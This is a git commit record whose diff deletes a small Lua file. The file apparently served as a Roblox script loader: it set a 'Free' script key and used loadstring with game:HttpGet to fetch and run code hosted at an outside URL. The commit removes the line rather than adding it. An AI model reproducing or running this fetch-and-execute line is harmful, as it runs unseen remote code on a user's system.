ba36f11f68b4874348e6bb1899239a14f6ec775a
Yerba.cc <kiciabot2@gmail.com>
2026-05-25 20:39:05 -0400

    Delete Script directory

--- Script/.cc
+++
@@ -1,3 +0,0 @@
-script_key = "Free" -- made by unknown.
-
-loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/ec5b0a484a10a26a343e44f24d4b7b4efd103b9036570f0f206272d40d64a650.lua"))()
